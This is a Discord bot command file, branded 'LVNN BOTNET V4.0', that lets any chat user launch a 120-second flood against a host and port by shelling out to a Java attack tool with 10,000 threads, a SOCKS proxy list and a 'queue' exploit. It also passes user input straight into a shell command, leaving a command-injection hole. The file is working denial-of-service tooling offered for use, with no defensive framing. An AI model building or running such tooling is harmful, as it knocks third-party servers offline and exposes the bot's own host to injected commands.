const Discord = require("discord.js");

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
exec(`java -jar ultimate.jar host=${host} port=${port} proxiesFile=socks_proxies.txt threads=10000 attackTime=120 exploit=queue`, (error, stdout, stderr) => {
});
console.log('An Attack Launched Discord ID:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **LVNN BOTNET V4.0** 🔥')
	.setTimestamp()
	.setDescription("**► Method: Ultra 💥** \n \n ► Attack started! ✅ \n ► for 120 seconds! 🕒 \n ☆ Flood by BlackCrack SQUAD ☆")
	.setFooter('© Developer Mareczekkkk#9738.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['ultra'],
  permLevel: 0
}

exports.help = {
  name: 'ultra',
  description: 'Özel',
  usage: 'ultra'
}